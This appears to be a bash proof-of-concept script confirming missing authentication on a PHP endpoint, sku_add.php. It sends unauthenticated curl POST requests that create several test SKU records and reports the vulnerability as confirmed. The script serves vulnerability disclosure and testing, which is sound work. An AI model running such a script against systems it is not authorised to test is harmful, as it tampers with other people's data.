#!/bin/bash

# POC: Missing Authentication and Authorization on sku_add.php
# This script demonstrates that unauthenticated users can create arbitrary SKU records

TARGET_URL="${1:-http://localhost:8080}"
SKU_ADD_ENDPOINT="${TARGET_URL}/app/sku_add.php"

echo "[*] Testing missing authentication on sku_add.php"
echo "[*] Target: ${SKU_ADD_ENDPOINT}"
echo ""

# Test 1: Create a record without any authentication
echo "[*] Test 1: Creating SKU record without authentication"
RESPONSE=$(curl -s -X POST \
  -d "sku=UNAUTH_SKU_001&name=Unauthorized Record&description=Created without authentication" \
  "${SKU_ADD_ENDPOINT}" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[+] HTTP Response Code: ${HTTP_CODE}"
echo "[+] Response Body: ${BODY}"
echo ""

# Test 2: Verify record was created by attempting to access it
# (This requires knowing the database structure or attempting to enumerate IDs)
echo "[*] Test 2: Demonstrating repeated unauthorized creation attempts"
for i in {1..3}; do
    RESPONSE=$(curl -s -X POST \
      -d "sku=UNAUTH_SKU_${i}&name=Unauthorized Record ${i}&description=Record ${i} created without authentication" \
      "${SKU_ADD_ENDPOINT}" \
      -c /tmp/cookies_${i}.txt)
    
    echo "[+] Created record ${i} (SKU: UNAUTH_SKU_${i})"
done

echo ""
echo "[*] Test 3: Verify no session/authentication required"
# Make request without any session or authentication headers
RESPONSE=$(curl -s -X POST \
  -H "User-Agent: UnauthorizedBot/1.0" \
  -d "sku=UNAUTH_SKU_NOAUTH&name=No Auth Test&description=Created from bot without any auth" \
  "${SKU_ADD_ENDPOINT}" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

if [[ "$HTTP_CODE" == "302" ]] || [[ "$HTTP_CODE" == "200" ]]; then
    echo "[+] SUCCESS: Endpoint accepted unauthenticated request"
    echo "[+] HTTP Response Code: ${HTTP_CODE}"
    echo "[+] No authentication required - vulnerability confirmed!"
else
    echo "[-] Unexpected response code: ${HTTP_CODE}"
fi

echo ""
echo "[*] Vulnerability: Missing Authentication on sku_add.php"
echo "[*] Impact: Unauthenticated users can create arbitrary SKU records"
echo "[*] Status: CONFIRMED"